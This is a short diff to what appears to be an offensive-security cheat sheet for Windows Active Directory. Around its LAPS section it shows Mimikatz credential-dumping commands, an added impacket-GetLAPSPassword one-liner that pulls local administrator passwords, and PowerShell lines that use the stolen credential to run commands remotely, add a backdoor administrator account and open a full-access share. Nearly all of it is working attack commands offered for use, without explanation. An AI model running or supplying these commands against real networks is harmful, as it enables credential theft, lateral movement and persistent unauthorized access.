@@ -1783,7 +1783,8 @@ vault::list
 vault::cred /patch
 sekurlsa::dpapi
 
-+---------- LAPS (Execute Commands) ----------+
++---------- LAPS ----------+
+impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
 $computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { hostname; whoami; ipconfig /all }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf }
